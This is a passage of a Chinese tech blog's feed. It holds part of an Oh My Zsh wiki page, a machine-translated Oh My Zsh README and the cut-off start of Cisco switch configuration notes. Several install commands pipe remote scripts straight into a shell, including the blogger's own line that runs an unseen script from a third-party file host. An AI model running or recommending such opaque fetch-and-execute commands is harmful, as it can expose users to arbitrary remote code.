Zsh</li></ul><p>We use manually-constructed screenshots because some of the themes require additional terminal configuration to look their best, and so the code in example shell sessions can showcase the theme’s features. There is also a separate collection of automatically-generated screenshots linked <a href="#screenshots-of-each-theme">at the bottom of this page</a>.</p><h3 id="Uploading-screenshots-to-GitHub"><a href="#Uploading-screenshots-to-GitHub" class="headerlink" title="Uploading screenshots to GitHub"></a>Uploading screenshots to GitHub</h3><p>We host all the screenshot images on GitHub itself, to avoid external dependencies on other hosting services or URLs that might break.Please, compress images before. We use issue attachments which will get them in to githubusercontent.com. (It’s also possible to store image files in a GitHub wiki itself, but this requires you to have Contributor permissions for the repo whose Wiki you’re editing. The issue-attachment method can be done by anybody.)</p><p>To upload an image to GitHub, just drag and drop it into the text area on an issue you’re editing. You can use issue #3619 for this to avoid spamming people with notifications about new issues. The uploaded image will turn in to an image in Markdown format. Edit that to use the special <code>[![name](image-url)](image-url)</code> syntax to make the image link to itself, so people can open the image in a new tab to view it full size. (Images inside a wiki page may be displayed scaled down.)</p><p>For example:</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">![wezm</span>](<span class="link">https://cloud.githubusercontent.com/assets/1441704/6315419/915f6ca6-ba01-11e4-95b3-2c98114b5e5c.png</span>)](<span class="link">https://cloud.githubusercontent.com/assets/1441704/6315419/915f6ca6-ba01-11e4-95b3-2c98114b5e5c.png</span>)</span><br></pre></td></tr></table></figure><p>If you have several uploaded screenshot links you need to convert to that self-linked syntax, you can use this <code>sed</code> command on the markdown file to programmatically convert them.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed <span class="string">&#x27;s/^!\[[a-zA-Z0-9 -]*\](\([^)]*\)) *$/[&amp;](\1)/&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Screenshots-of-each-Theme"><a href="#Screenshots-of-each-Theme" class="headerlink" title="Screenshots of each Theme"></a>Screenshots of each Theme</h2><h3 id="Version-2019-08"><a href="#Version-2019-08" class="headerlink" title="Version 2019-08"></a>Version 2019-08</h3><p>The current set of theme screenshots was generated automatically by <a href="https://github.com/Kovah">@Kovah</a>’s <a href="https://github.com/Kovah/oh-my-zsh-screenshot-generation">Oh My Zsh-screenshot-generation tool</a>, using on macOS Mojave (10.14.5) with the macOS Terminal app. The used theme is <code>Basic</code> with the default settings and colors. The font was switched to <code>Fira Code</code> at 13 pt to enable some special characters in certain themes. All terminal windows have a size of 100x31.</p><h3 id="Version-2013-04"><a href="#Version-2013-04" class="headerlink" title="Version 2013-04"></a>Version 2013-04</h3><p><a href="https://www.dropbox.com/sh/u532agyv1hyash1/LS9yNESRlQ?lst">Screenshot collection</a> (as of 2013-04-10), in OS X Terminal.app using Consolas 13pt and Pro color scheme, inside a folder containing both a git and a mercurial repo. Each screenshot displays the output of the <code>pwd</code> command. It has shortcomings (plugins for some themes might be missing), but it offers a convenient and uniform overview of each theme. Plugins used were battery, rvm, hg prompt, among others.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;This wiki is automatically published from &lt;a href=&quot;https://github.com/ohmyzsh/wiki&quot;&gt;ohmyzsh&amp;#x2F;wiki&lt;/a&gt;. To edit this </summary>
      
    
    
    
    <category term="开源项目" scheme="https://dxhm.github.io/categories/%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="linux" scheme="https://dxhm.github.io/tags/linux/"/>
    
    <category term="github - tools" scheme="https://dxhm.github.io/tags/github-tools/"/>
    
  </entry>
  
  <entry>
    <title>README for Oh My Zsh</title>
    <link href="https://dxhm.github.io/2022/04/28/ohmyzsh-readme/"/>
    <id>https://dxhm.github.io/2022/04/28/ohmyzsh-readme/</id>
    <published>2022-04-28T15:03:24.000Z</published>
    <updated>2023-07-07T16:03:41.786Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于Oh-My-Zsh"><a href="#关于Oh-My-Zsh" class="headerlink" title="关于Oh My Zsh"></a>关于Oh My Zsh</h1><p>Oh My Zsh是一个开源的，社区驱动的框架，用于管理<a href="https://www.zsh.org/">您的zsh</a>配置。</p><p>听起来很无聊。让我们再试一次。</p><p><strong>哦，我的Zsh不会让你成为10x开发人员…但你可能会觉得自己像一个。</strong></p><p>一旦安装，您的终端外壳将成为镇上的话题<em>或您的钱回来！</em>在命令提示符下每次击键时，您都将利用数百个功能强大的插件和精美的主题。陌生人会在咖啡馆里走到你面前，问你<em>：“这太神奇了！你是某种天才吗？</em></p><p>最后，你将开始得到你一直觉得自己应得的那种关注。…或者，也许您将利用节省的时间更频繁地开始使用牙线。😬</p><p>要了解更多信息，请访问  <a href="https://ohmyz.sh/">ohmyz.sh</a>，在Twitter上关注<a href="https://twitter.com/ohmyzsh">@ohmyzsh</a>，并在<a href="https://discord.gg/ohmyzsh">Discord</a>上加入我们。</p><p><a href="https://github.com/ohmyzsh/ohmyzsh/actions?query=workflow:CI"><img src="https://github.com/ohmyzsh/ohmyzsh/workflows/CI/badge.svg" alt="词"></a>  <a href="https://twitter.com/intent/follow?screen_name=ohmyzsh"><img src="https://camo.githubusercontent.com/11a416635f3d1f03b7a97eac9d92f96b165ffe65a18199d50503e1e5f3c7b633/68747470733a2f2f696d672e736869656c64732e696f2f747769747465722f666f6c6c6f772f6f686d797a73683f6c6162656c3d466f6c6c6f772b406f686d797a7368267374796c653d666c6174" alt="关注@ohmyzsh"></a><a href="https://discord.gg/ohmyzsh"><img src="https://camo.githubusercontent.com/64e8b917c8acd4f1b4c183948adc71b474cd574e5b36882f06c13631ad57ec6f/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f363432343936383636343037323834373436" alt="不和谐服务器"></a><a href="https://gitpod.io/#https://github.com/ohmyzsh/ohmyzsh"><img src="https://camo.githubusercontent.com/eed956a921d6c38546e378ad7ee005b423b76361eef47db35b6afb2c71c8a090/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f476974706f642d72656164792d626c75653f6c6f676f3d676974706f64" alt="Gitpod ready"></a><a href="https://huntr.dev/bounties/disclose/?utm_campaign=ohmyzsh/ohmyzsh&utm_medium=social&utm_source=github&target=https://github.com/ohmyzsh/ohmyzsh"><img src="https://camo.githubusercontent.com/30c28e8a19d49b9af85a85ca1c2911731b9659e2e8596315faf92162888f162f/68747470733a2f2f63646e2e68756e74722e6465762f68756e74725f73656375726974795f62616467655f6d6f6e6f2e737667" alt="huntr.dev"></a></p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a><a href="https://github.com/ohmyzsh/ohmyzsh#getting-started"></a>开始</h2><h3 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#prerequisites"></a>先决条件</h3><ul><li>类Unix操作系统：macOS，Linux，BSD。在Windows上：WSL2是首选，但cygwin或msys也大多工作。</li><li>应该安装<a href="https://www.zsh.org/">Zsh</a>（v4.3.9或更新的版本很好，但我们更喜欢5.0.8及更高版本）。如果未预安装（运行以确认），请在此处查看以下wiki说明：<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Installing-ZSH">安装ZSH</a><code>zsh --version</code></li><li><code>curl</code>或应安装<code>wget</code></li><li><code>git</code>应安装（建议使用 v2.4.11 或更高版本）</li></ul><h3 id="基本安装"><a href="#基本安装" class="headerlink" title="基本安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#basic-installation"></a>基本安装</h3><p>Oh My Zsh 是通过在终端中运行以下命令之一来安装的。您可以通过命令行安装它，也可以使用 或其他类似工具。<code>curl``wget</code></p><table><thead><tr><th>方法</th><th>命令</th></tr></thead><tbody><tr><td><strong>curl</strong></td><td><code>sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</code></td></tr><tr><td><strong>wget</strong></td><td><code>sh -c &quot;$(wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</code></td></tr><tr><td><strong>fetch</strong></td><td><code>sh -c &quot;$(fetch -o - https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</code></td></tr></tbody></table><p><em>请注意，任何以前的  <code>.zshrc</code>  都将重命名为  <code>.zshrc.pre-oh-my-zsh</code>。安装后，可以将要保留的配置移动到新的  <code>.zshrc 中</code>。</em></p><h4 id="手动检查"><a href="#手动检查" class="headerlink" title="手动检查"></a><a href="https://github.com/ohmyzsh/ohmyzsh#manual-inspection"></a>手动检查</h4><p>最好从您还不知道的项目中检查安装脚本。为此，您可以先下载安装脚本，浏览它以使一切正常，然后运行它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh</span><br><span class="line">sh install.sh</span><br></pre></td></tr></table></figure><h2 id="使用-Oh-My-Zsh"><a href="#使用-Oh-My-Zsh" class="headerlink" title="使用 Oh My Zsh"></a><a href="https://github.com/ohmyzsh/ohmyzsh#using-oh-my-zsh"></a>使用 Oh My Zsh</h2><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#plugins"></a>插件</h3><p>哦，我的Zsh附带了大量插件供您利用。您可以查看<a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins">插件</a>目录和&#x2F;或<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Plugins">wiki</a>，以查看当前可用的内容。</p><h4 id="启用插件"><a href="#启用插件" class="headerlink" title="启用插件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#enabling-plugins"></a>启用插件</h4><p>一旦你发现一个（或几个）你想与Oh My Zsh一起使用的插件，你就需要在文件中启用它们。您将在目录中找到 zshrc 文件。使用您喜欢的文本编辑器打开它，您将看到一个列出要加载的所有插件的位置。<code>.zshrc``$HOME</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi ~/.zshrc</span><br></pre></td></tr></table></figure><p>例如，这可能开始看起来像这样：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">  git</span><br><span class="line">  bundler</span><br><span class="line">  dotenv</span><br><span class="line">  macos</span><br><span class="line">  rake</span><br><span class="line">  rbenv</span><br><span class="line">  ruby</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><em>请注意，插件由空格（空格，制表符，新行…）分隔。<strong>不要在</strong>它们之间使用逗号，否则它会中断。</em></p><h4 id="使用插件"><a href="#使用插件" class="headerlink" title="使用插件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#using-plugins"></a>使用插件</h4><p>每个内置插件都包含一个<strong>自述文件</strong>，用于记录它。此自述文件应显示别名（如果插件添加了任何别名）以及该特定插件中包含的其他好东西。</p><h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#themes"></a>主题</h3><p>我们承认这一点。在Oh My Zsh世界的早期，我们可能有点太快乐了。我们现在捆绑了一百五十多个主题。他们中的大多数在wiki上都有<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Themes">屏幕截图</a>（我们正在努力更新这个！看看他们！</p><h4 id="选择主题"><a href="#选择主题" class="headerlink" title="选择主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#selecting-a-theme"></a>选择主题</h4><p><em>Robby的主题是默认主题。这不是最花哨的。这不是最简单的一个。这对他来说是正确的。</em></p><p>找到要使用的主题后，您需要编辑该文件。您将在那里看到一个环境变量（全部大写），如下所示：<code>~/.zshrc</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZSH_THEME=&quot;robbyrussell&quot;</span><br></pre></td></tr></table></figure><p>要使用其他主题，只需更改值以匹配所需主题的名称即可。例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ZSH_THEME=&quot;agnoster&quot; # (this is one of the fancy ones)</span><br><span class="line"><span class="meta"># </span><span class="language-bash">see https://github.com/ohmyzsh/ohmyzsh/wiki/Themes<span class="comment">#agnoster</span></span></span><br></pre></td></tr></table></figure><p><em>注意：许多主题需要安装  <a href="https://github.com/powerline/fonts">Powerline 字体</a> 或  <a href="https://github.com/ryanoasis/nerd-fonts">书字体</a> 才能正确呈现。没有它们，这些主题将呈现<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/FAQ#i-have-a-weird-character-in-my-prompt">奇怪的提示符号</a></em></p><p>打开一个新的终端窗口，您的提示应如下所示：</p><p><a href="https://cloud.githubusercontent.com/assets/2618447/6316862/70f58fb6-ba03-11e4-82c9-c083bf9a6574.png"><img src="https://cloud.githubusercontent.com/assets/2618447/6316862/70f58fb6-ba03-11e4-82c9-c083bf9a6574.png" alt="“阿格诺斯特”主题"></a></p><p>如果您没有找到适合您需求的主题，请查看wiki以获取<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/External-themes">更多主题</a>。</p><p>如果您感到精力充沛，每次打开新的终端窗口时，都可以让计算机为您随机选择一个。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZSH_THEME=&quot;random&quot; # (...please let it be pie... please be some pie..)</span><br></pre></td></tr></table></figure><p>如果您想从自己喜欢的主题列表中选择随机主题：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ZSH_THEME_RANDOM_CANDIDATES=(</span><br><span class="line">  &quot;robbyrussell&quot;</span><br><span class="line">  &quot;agnoster&quot;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>如果您只知道自己不喜欢哪些主题，则可以将它们添加到忽略的列表中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZSH_THEME_RANDOM_IGNORED=(pygmalion tjkirch_mod)</span><br></pre></td></tr></table></figure><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#faq"></a>常见问题</h3><p>如果您还有其他疑问或问题，可以在我们的<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/FAQ">常见问题解答</a>中找到解决方案。</p><h2 id="高级主题"><a href="#高级主题" class="headerlink" title="高级主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#advanced-topics"></a>高级主题</h2><p>如果你是那种喜欢亲自动手的人，这些部分可能会引起共鸣。</p><h3 id="高级安装"><a href="#高级安装" class="headerlink" title="高级安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#advanced-installation"></a>高级安装</h3><p>某些用户可能希望手动安装 Oh My Zsh，或者更改默认路径或安装程序接受的其他设置（这些设置也记录在安装脚本的顶部）。</p><h4 id="自定义目录"><a href="#自定义目录" class="headerlink" title="自定义目录"></a><a href="https://github.com/ohmyzsh/ohmyzsh#custom-directory"></a>自定义目录</h4><p>默认位置是（隐藏在您的主目录中，您可以使用<code>~/.oh-my-zsh``cd ~/.oh-my-zsh</code>)</p><p>如果要使用环境变量更改安装目录，请在安装之前运行，或在安装管道结束之前对其进行设置，如下所示：<code>ZSH``export ZSH=/your/path</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZSH=&quot;$HOME/.dotfiles/oh-my-zsh&quot; sh install.sh</span><br></pre></td></tr></table></figure><h4 id="无人参与安装"><a href="#无人参与安装" class="headerlink" title="无人参与安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#unattended-install"></a>无人参与安装</h4><p>如果您在自动安装过程中运行 Oh My Zsh 安装脚本，则可以将标志传递给该脚本。这将具有不尝试更改默认 shell 的效果，并且在安装完成后它也不会运行。<code>--unattended``install.sh``zsh</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot; &quot;&quot; --unattended</span><br></pre></td></tr></table></figure><h4 id="从分叉存储库安装"><a href="#从分叉存储库安装" class="headerlink" title="从分叉存储库安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#installing-from-a-forked-repository"></a>从分叉存储库安装</h4><p>安装脚本还接受以下变量以允许安装不同的存储库：</p><ul><li><p><code>REPO</code>（默认值：）：其形式为 .如果设置此变量，安装程序将在 中查找存储库。<code>ohmyzsh/ohmyzsh``owner/repository``https://github.com/&#123;owner&#125;/&#123;repository&#125;</code></p></li><li><p><code>REMOTE</code>（默认值：）：这是 git 存储库克隆的完整 URL。如果要从不在 GitHub 上的分叉（GitLab、Bitbucket…）进行安装，或者要使用 SSH 而不是 HTTPS 进行克隆（），则可以使用此设置。<code>https://github.com/$&#123;REPO&#125;.git``git@github.com:user/project.git</code></p><p>  <em>注意：它与设置  <code>REPO</code>  变量不兼容。此设置将优先。</em></p></li><li><p><code>BRANCH</code>（默认值：）：如果要在克隆存储库时更改要签出的默认分支，则可以使用此设置。这对于测试拉取请求或要使用 以外的分支可能很有用。<code>master``master</code></p></li></ul><p>例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPO=apjanke/oh-my-zsh BRANCH=edge sh install.sh</span><br></pre></td></tr></table></figure><h4 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#manual-installation"></a>手动安装</h4><h5 id="1-克隆存储库"><a href="#1-克隆存储库" class="headerlink" title="1. 克隆存储库"></a><a href="https://github.com/ohmyzsh/ohmyzsh#1-clone-the-repository-"></a>1. 克隆存储库</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ohmyzsh/ohmyzsh.git ~/.oh-my-zsh</span><br></pre></td></tr></table></figure><h5 id="2-可选，备份现有文件-zshrc"><a href="#2-可选，备份现有文件-zshrc" class="headerlink" title="2.可选，备份现有文件~/.zshrc"></a><a href="https://github.com/ohmyzsh/ohmyzsh#2-optionally-backup-your-existing-zshrc-file-"></a>2.<em>可选，</em>备份现有文件<code>~/.zshrc</code></h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ~/.zshrc ~/.zshrc.orig</span><br></pre></td></tr></table></figure><h5 id="3-创建新的-zsh-配置文件"><a href="#3-创建新的-zsh-配置文件" class="headerlink" title="3. 创建新的 zsh 配置文件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#3-create-a-new-zsh-configuration-file-"></a>3. 创建新的 zsh 配置文件</h5><p>您可以通过复制我们为您包含的模板来创建新的 zsh 配置文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc</span><br></pre></td></tr></table></figure><h5 id="4-更改默认外壳"><a href="#4-更改默认外壳" class="headerlink" title="4. 更改默认外壳"></a><a href="https://github.com/ohmyzsh/ohmyzsh#4-change-your-default-shell-"></a>4. 更改默认外壳</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chsh -s $(which zsh)</span><br></pre></td></tr></table></figure><p>您必须从用户会话注销并重新登录才能看到此更改。</p><h5 id="5-初始化新的-zsh-配置"><a href="#5-初始化新的-zsh-配置" class="headerlink" title="5. 初始化新的 zsh 配置"></a><a href="https://github.com/ohmyzsh/ohmyzsh#5-initialize-your-new-zsh-configuration-"></a>5. 初始化新的 zsh 配置</h5><p>打开新的终端窗口后，它应该使用Oh My Zsh的配置加载zsh。</p><h3 id="安装问题"><a href="#安装问题" class="headerlink" title="安装问题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#installation-problems"></a>安装问题</h3><p>如果您安装任何打嗝，以下是一些常见的修复程序。</p><ul><li>如果在切换到 后无法找到某些命令，则<em>可能需要</em>修改 in。<code>PATH``~/.zshrc``oh-my-zsh</code></li><li>如果手动安装或更改了安装位置，请检查 中的环境变量。<code>ZSH``~/.zshrc</code></li></ul><h3 id="自定义插件和主题"><a href="#自定义插件和主题" class="headerlink" title="自定义插件和主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#custom-plugins-and-themes"></a>自定义插件和主题</h3><p>如果要覆盖任何默认行为，只需在目录中添加一个新文件（以 结尾）。<code>.zsh``custom/</code></p><p>如果您有许多功能可以很好地组合在一起，则可以将它们作为文件放在目录中，然后启用此插件。<code>XYZ.plugin.zsh``custom/plugins/</code></p><p>如果要覆盖使用 Oh My Zsh 分发的插件的功能，请在目录中创建一个同名的插件，该插件将被加载，而不是 .<code>custom/plugins/``plugins/</code></p><h2 id="获取更新"><a href="#获取更新" class="headerlink" title="获取更新"></a><a href="https://github.com/ohmyzsh/ohmyzsh#getting-updates"></a>获取更新</h2><p>默认情况下，系统将提示您每 2 周检查一次更新。您可以在<strong>加载Oh My Zsh之前</strong>，通过向文件添加一行来选择其他更新模式：<code>~/.zshrc</code></p><ol><li><p>自动更新，无确认提示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zstyle &#x27;:omz:update&#x27; mode auto</span><br></pre></td></tr></table></figure></li><li><p>如果有可用的更新，只需每隔几天提供一次提醒：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zstyle &#x27;:omz:update&#x27; mode reminder</span><br></pre></td></tr></table></figure></li><li><p>要完全禁用自动更新：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zstyle &#x27;:omz:update&#x27; mode disabled</span><br></pre></td></tr></table></figure></li></ol><p>注意：您可以使用以下设置控制 Oh My Zsh 检查更新的频率：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">This will check <span class="keyword">for</span> updates every 7 days</span></span><br><span class="line">zstyle &#x27;:omz:update&#x27; frequency 7</span><br><span class="line"><span class="meta"># </span><span class="language-bash">This will check <span class="keyword">for</span> updates every time you open the terminal (not recommended)</span></span><br><span class="line">zstyle &#x27;:omz:update&#x27; frequency 0</span><br></pre></td></tr></table></figure><h3 id="手动更新"><a href="#手动更新" class="headerlink" title="手动更新"></a><a href="https://github.com/ohmyzsh/ohmyzsh#manual-updates"></a>手动更新</h3><p>如果你想在任何时间点更新（也许有人刚刚发布了一个新插件，你不想等一个星期？），你只需要运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">omz update</span><br></pre></td></tr></table></figure><p>魔法！🎉</p><h2 id="卸载-Oh-My-Zsh"><a href="#卸载-Oh-My-Zsh" class="headerlink" title="卸载 Oh My Zsh"></a><a href="https://github.com/ohmyzsh/ohmyzsh#uninstalling-oh-my-zsh"></a>卸载 Oh My Zsh</h2><p>哦，我的Zsh并不适合所有人。我们会想念你的，但我们想让这很容易分手。</p><p>如果要卸载 ，只需从命令行运行即可。它将删除自身并还原以前的配置或配置。<code>oh-my-zsh``uninstall_oh_my_zsh``bash``zsh</code></p><h2 id="【推荐】国内脚本配置安装"><a href="#【推荐】国内脚本配置安装" class="headerlink" title="【推荐】国内脚本配置安装"></a>【推荐】国内脚本配置安装</h2><p>考虑到官方方法，需要连接GitHub；如果你的设备无法有效访问GitHub。可以使用我配置的脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsh -c &quot;$(curl -fsSL &#x27;https://api.host.mintimate.cn/fileHost/public/download/1P0R&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>为了保证脚本能顺利运行，你的Linux&#x2F;Mac服务器需要：</p><blockquote><p>提前安装curl、unzip,如果有~&#x2F;.zshrc文件，最好提前备份，否则本脚本自动更改原本的.zshrc文件为zshrcBak</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;关于Oh-My-Zsh&quot;&gt;&lt;a href=&quot;#关于Oh-My-Zsh&quot; class=&quot;headerlink&quot; title=&quot;关于Oh My Zsh&quot;&gt;&lt;/a&gt;关于Oh My Zsh&lt;/h1&gt;&lt;p&gt;Oh My Zsh是一个开源的，社区驱动的框架，用于管理&lt;a hre</summary>
      
    
    
    
    <category term="开源项目" scheme="https://dxhm.github.io/categories/%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="github" scheme="https://dxhm.github.io/tags/github/"/>
    
    <category term="tools" scheme="https://dxhm.github.io/tags/tools/"/>
    
    <category term="linux" scheme="https://dxhm.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>SWITCH &amp; ROUTER</title>
    <link href="https://dxhm.github.io/2022/03/24/%E8%B7%AF%E7%94%B1%E4%B8%8E%E4%BA%A4%E6%8D%A2%E6%8A%80%E6%9C%AF/"/>
    <id>https://dxhm.github.io/2022/03/24/%E8%B7%AF%E7%94%B1%E4%B8%8E%E4%BA%A4%E6%8D%A2%E6%8A%80%E6%9C%AF/</id>
    <published>2022-03-24T08:00:34.000Z</published>
    <updated>2023-06-30T10:37:59.068Z</updated>
    
    <content type="html"><![CDATA[<h1 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h1><ol><li>交换机switch的基本功能<ol><li>学习功能</li><li>转发&#x2F;过滤</li><li>支持冗余链路</li><li>对VLAN（虚拟局域网）的支持</li></ol></li><li>二层结构交换机特点：数据链路层，无三层口，需要虚拟接口vlan（vlan 1为默认管理接口，默认所有端口都在vlan1） <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Switch&gt;enable </span><br><span class="line">Switch#configure terminal</span><br><span class="line">SwitchA (config-if)# no shutdown  //开启</span><br></pre></td></tr></table></figure></li><li>交换机分类：<ol><li>按架构特点<br> a. 机架式、带扩展槽固定配置式、不带扩展槽固定配置式</li><li>按应用规模</li><li>按传输介质和传输速度</li><li>按OSI的分层结构</li></ol></li><li>二层交换机工作原理<ol><li>根据收到数据帧总的源mac建立地址同交换机端口的映射，并将其写入mac地址表中</li><li>交换机根据数据帧中的mac地址同已建立的mac地址表比较，在决定由哪个端口转发<ol><li>目的mac地址不在mac表中，则向所有端口转发（广播）</li><li>广播帧和组播帧向所有的端口转发</li></ol></li></ol></li><li>交换机交换方式：<ol><li>直通</li><li>存储转发</li><li>碎片隔离</li></ol></li><li>交换机的级联和堆叠<ol><li>级联『分开配置』<ol><li>使用Uplink端口级联</li><li>使用普通端口级联</li></ol></li><li>堆叠『总体配置』<ol><li>菊花链式堆叠（类似：RAID冗余磁盘阵列）</li><li>星型堆叠</li></ol></li></ol></li><li>交换机管理模式<ol><li>超级终端管理模式<ul><li>console口链接交换机（配置线DB9-to-DB9）</li><li>波特率9600，数据位8</li></ul></li><li>Telnet管理模式<ol><li>相关配置 <figure class="highlight c"><figcaption><span>isco switch</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">switchA(config)<span class="meta"># <span class="keyword">line</span> vty 0 4  <span class="comment">// 指同时允许5个虚拟终端登陆进行配置</span></span></span><br><span class="line">switchA(config-line)<span class="meta"># password pwd1   <span class="comment">//password</span></span></span><br><span class="line">switchA(config-line)<span class="meta"># login  <span class="comment">//启用密码认证，默认关闭</span></span></span><br></pre></td></tr></table></figure></li><li>配置登录密码： <figure class="highlight c"><figcaption><span>isco</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SwitchA (config)<span class="meta"># enable secret level 1 0 pwd1  </span></span><br><span class="line"><span class="comment">// secret：MD5加密；</span></span><br><span class="line"><span class="comment">// level：指定密码用于哪个级别；</span></span><br><span class="line"><span class="comment">// 1：用户模式；</span></span><br><span class="line"><span class="comment">// 0：即将输入初始密码（5：cisco的MD5值）</span></span><br></pre></td></tr></table></figure></li><li>配置特权模式口令 <figure class="highlight c"><figcaption><span>isco switch</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SwitchA (config)<span class="meta"># enable secret level 14 0 pwd2</span></span><br></pre></td></tr></table></figure></li></ol></li><li>Web管理模式<h1 id="虚拟局域网"><a href="#虚拟局域网" class="headerlink" title="虚拟局域网"></a>虚拟局域网</h1></li></ol></li><li><h2 id="VLAN"><a href="#VLAN" class="headerlink" 